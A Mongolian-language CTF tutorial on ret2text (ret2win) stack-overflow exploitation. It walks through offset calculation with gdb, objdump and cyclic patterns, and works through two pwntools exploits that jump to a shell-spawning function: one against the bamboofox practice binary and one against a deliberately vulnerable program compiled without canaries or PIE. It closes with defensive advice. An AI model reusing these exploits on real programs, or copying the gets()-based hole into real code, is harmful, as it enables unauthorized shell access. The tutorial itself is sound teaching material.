---
title: ret2text
description: Stack overflow ашиглан программын өөрийн код (.text) руу үсрэх хамгийн энгийн ROP арга.
---

**ret2text** (return-to-text) нь stack overflow-оор функцийн **буцах хаяг (return address)**-ийг дарж бичээд,
программ дотор **аль хэдийн байгаа** кодын хэсэг рүү үсрэх арга юм. Нэр нь ELF файлын `.text`
хэсгээс гаралтай — программын машин код тэнд байрладаг.

Ихэнх CTF бодлогод `win()`, `flag()`, `shell()` гэх мэт хэзээ ч дуудагддаггүй функц
байдаг. Иймээс ret2text-ийг **ret2win** гэж бас нэрлэдэг.

:::note[Урьдчилсан мэдлэг]
- C хэлний үндэс, `gets()`/`read()` зэрэг функц
- x86 / x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
- `gdb` (pwndbg эсвэл GEF) болон Python-ий `pwntools`
:::

## Санаа

Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (32-bit):

```
  хаяг
 +----------------------+
 |  return address      |  <- ebp + 4   ← бид үүнийг дарж бичнэ
 +----------------------+
 |  saved ebp           |  <- ebp
 +----------------------+
 |                      |
 |  char buf[...]       |  <- бидний оруулсан өгөгдөл эндээс эхэлнэ
 |                      |
 +----------------------+
 хаяг
```

`gets()` шиг урт шалгадаггүй функц `buf`-аас илүү өгөгдөл хүлээж авбал өгөгдөл **дээшээ** (их хаяг руу)
урсаж, `saved ebp`, улмаар `return address`-ийг дарна. Функц `ret` заавар гүйцэтгэх үед CPU stack-ийн оройгоос
хаягийг аваад тийш үсэрдэг — тэр хаяг одоо **бидний сонгосон** хаяг болсон байна.

Тиймээс халдлагын өгөгдөл (payload) ердөө хоёр хэсэгтэй:

```
[ padding: buf-ийн эхнээс return address хүртэлх байт ] + [ зорилтот хаяг ]
```

Бидэнд хоёр зүйл л олох хэрэгтэй:

1. **Offset** — `buf`-ийн эхнээс return address хүртэл хэдэн байт байгаа вэ?
2. **Зорилтот хаяг** — хаашаа үсрэх вэ?

ret2text ажиллах нөхцөл:

| Хамгаалалт | Шаардлага | Яагаад |
|------------|-----------|--------|
| Stack canary | **Байхгүй** | Canary байвал overflow-ийг `ret`-ээс өмнө илрүүлээд программыг зогсооно |
| PIE | **Байхгүй** (эсвэл хаяг leak хийсэн) | PIE байвал `.text`-ийн хаяг ажиллах бүрт өөрчлөгдөнө |
| NX | Хамаагүй | Бид shellcode ажиллуулахгүй, байгаа кодыг л ашиглана |

## Жишээ 1: bamboofox ret2text (32-bit)

Энэ жишээ [CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)-ээс авсан.
Binary-г тэр хуудаснаас татаж авна.

### Эх код

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("/bin/sh");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("There is something amazing here, do you know anything?\n");
    gets(buf);
    printf("Maybe I will tell you next time !");

    return 0;
}
```

Хоёр зүйл анхаарал татна:

- `main` дотор `gets(buf)` — урт шалгахгүй тул **stack overflow** байна.
- `secure()` функц `system("/bin/sh")` дууддаг ч санамсаргүй тоог таах шаардлагатай. `main` үүнийг огт дууддаггүй.

### Хамгаалалт шалгах

```console
$ checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Canary байхгүй, PIE байхгүй — ret2text хийхэд тохиромжтой.

### Зорилтот хаягийг олох

`secure()`-ийн disassembly (IDA):

```asm
.text:0804862D     call    ___isoc99_scanf
.text:08048632     mov     eax, [ebp+input]
.text:08048635     cmp     eax, [ebp+secretcode]
.text:08048638     jnz     short locret_8048646
.text:0804863A     mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641     call    _system
```

`secure()`-ийн эхэнд үсэрвэл санамсаргүй тоо таах хэрэгтэй болно. Харин **шалгалтын дараах**
`0x0804863A` хаяг руу шууд үсэрвэл `"/bin/sh"`-ийг аргумент болгон тавиад `system()`-ийг дуудна —
`if` шалгалтыг бүхэлд нь алгасна.

:::tip
Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
Үүгээр шалгалт, нөхцөлийг алгасах боломжтой.
:::

### Offset тооцох

`main`-ийн `gets` дуудах хэсэг:

```asm
.text:080486A7     lea     eax, [esp+1Ch]
.text:080486AB     mov     [esp], eax      ; s
.text:080486AE     call    _gets
```

`buf` нь `esp + 0x1c` дээр байна. `main` эхэндээ `and esp, 0FFFFFFF0h` хийж stack-ийг тэгшилдэг тул
`buf`-ийн `ebp`-ээс хэр зайтайг статикаар тооцоход төвөгтэй. Иймд gdb-ээр `gets` дуудахын өмнө зогсоож
регистрүүдийг харъя:

```console
$ gdb ./ret2text
gef➤  b *0x080486AE
gef➤  r
...
$esp   : 0xffffcd40
$ebp   : 0xffffcdc8
```

Тооцоо:

```
buf            = esp + 0x1c       = 0xffffcd5c
ebp - buf      = 0xffffcdc8 - 0xffffcd5c = 0x6c   (108 байт)
return address = ebp + 4
offset         = 0x6c + 4         = 0x70   (112 байт)
```

:::caution
Эх кодод `char buf[100]` гэж байгаа ч бодит offset нь `100 + 4` **биш**. Compiler тэгшлэх (alignment)
болон бусад хувьсагчийн зай нэмдэг. Offset-ийг **үргэлж** debugger эсвэл disassembly-аас тодорхойл.
:::

### Exploit

```python
from pwn import *

p = process('./ret2text')

target = 0x0804863A          # system("/bin/sh") дуудах хэсэг
payload = b'A' * 0x70 + p32(target)

p.sendline(payload)
p.interactive()
```

`p32()` нь хаягийг **little-endian** 4 байт болгоно: `0x0804863A` → `\x3a\x86\x04\x08`.

## Жишээ 2: Өөрсдөө compile хийх (64-bit)

Орчин үеийн ихэнх бодлого 64-bit байдаг. Өөрийн компьютер дээр бүтэн процессыг давтаж үзье.

### Эх код ба compile

```c title="ret2text.c"
#include <stdio.h>
#include <stdlib.h>

char *gets(char *s); // шинэ glibc-ийн header-аас gets() хасагдсан

void win(void) {
    puts("Congrats! Here is your shell:");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    puts("What is your name?");
    gets(buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Bye!");
    return 0;
}
```

```console
$ gcc ret2text.c -o ret2text -fno-stack-protector -no-pie
$ checksec --file=ret2text
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

- `-fno-stack-protector` — canary-г унтраана
- `-no-pie` — `.text`-ийн хаягийг тогтмол болгоно

### Offset олох: статик арга

```console
$ objdump -d -M intel ret2text | grep -A12 '<vuln>:'
  4011c3:  push   rbp
  4011c4:  mov    rbp,rsp
  4011c7:  sub    rsp,0x40
  ...
  4011da:  lea    rax,[rbp-0x40]
  4011de:  mov    rdi,rax
  4011e1:  call   401090 <gets@plt>
  4011e6:  nop
  4011e7:  leave
  4011e8:  ret
```

`buf = rbp - 0x40`. 64-bit дээр `saved rbp` 8 байт тул:

```
offset = 0x40 + 8 = 72
```

### Offset олох: cyclic арга

Статик арга төвөгтэй үед **De Bruijn pattern** (`cyclic`) ашиглана. Энэ дараалал дахь 4 байт бүр
давтагдашгүй тул программ унах үед return address-д ямар утга орсныг хараад offset-ийг шууд олно.

```python title="find_offset.py"
from pwn import *

elf = context.binary = ELF('./ret2text')

p = process()
p.sendlineafter(b'name?\n', cyclic(200))
p.wait()                      # программ segfault болтол хүлээнэ

core = p.corefile             # core dump-ийг уншина
offset = cyclic_find(core.read(core.rsp, 4))
log.success(f'offset = {offset}')
```

```console
$ ulimit -c unlimited
$ python3 find_offset.py
[+] offset = 72
```

:::note
64-bit дээр буруу хаяг (`0x6161617461616173` гэх мэт) нь *canonical* биш тул CPU `ret` дээрээ унана —
`rip` өөрчлөгдөхгүй. Тиймээс `rip`-ийг биш, **`rsp`-ийн зааж буй утгыг** (`ret`-ийн авах гэж байсан хаяг) шалгадаг.
gdb дээр: `x/wx $rsp` хийж гарсан 4 байтыг `pwn cyclic -l 0x61616173` гэж хайна.
:::

### Stack alignment (movaps асуудал)

Эхлээд хамгийн энгийн payload-ийг туршъя:

```python
payload = b'A' * 72 + p64(elf.sym.win)
```

`win()` руу үсэрч, `"Congrats!"` хэвлэгдэх ч **shell нээгдэхгүй**, `system()` дотор segfault болно.

Шалтгаан: x86-64 System V ABI-ийн дагуу `call` хийх үед `rsp` **16 байтад тэгшлэгдсэн** байх ёстой.
glibc-ийн `system()` дотор `movaps` заавар байдаг бөгөөд тэгшлэгдээгүй хаяг дээр унадаг.
Бид функцийг `call`-аар биш `ret`-ээр эхлүүлсэн тул stack 8 байтаар зөрсөн.

Шийдэл: `win`-ийн өмнө нэг **`ret` gadget** нэмэх. Энэ нь юу ч хийхгүй, зөвхөн stack-ийг 8 байтаар
шилжүүлж тэгшилнэ.

:::tip
Өөр нэг арга: `win`-ийн эхний `push rbp`-г алгасаж `elf.sym.win + 5` (эсвэл `+1`, `endbr64` байхгүй бол)
руу үсрэх. Энэ нь бас 8 байтын зөрүүг засна.
:::

### Exploit

```python title="exploit.py"
from pwn import *

elf = context.binary = ELF('./ret2text')
p = process()

offset = 72
ret = ROP(elf).find_gadget(['ret'])[0]   # stack-ийг 16 байтад тэгшлэх

payload = flat(
    b'A' * offset,   # buf + saved rbp
    ret,             # alignment
    elf.sym.win,     # win() функцийн хаяг
)

p.sendlineafter(b'name?\n', payload)
p.interactive()
```

```console
$ python3 exploit.py
[*] Switching to interactive mode
Congrats! Here is your shell:
$ id
uid=1000(user) gid=1000(user) ...
```

`elf.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.

## Хамгаалалт

- `gets()`-ийг **хэзээ ч** бүү ашигла — `fgets(buf, sizeof(buf), stdin)` ашигла.
- Stack canary (`-fstack-protector-strong`, ихэнх distro-д анхнаасаа идэвхтэй).
- PIE + ASLR (`-pie`, мөн анхнаасаа идэвхтэй) — хаягийг таамаглахад хэцүү болгоно.
- Шаардлагагүй "debug" функцийг (`system("/bin/sh")` гэх мэт) production код-д бүү үлдээ.

## Эх сурвалж

- [CTF Wiki — Basic ROP: ret2text](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)
- [ir0nstone — ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win)
- [ir0nstone — De Bruijn Sequences](https://ir0nstone.gitbook.io/notes/binexp/stack/de-bruijn-sequences)
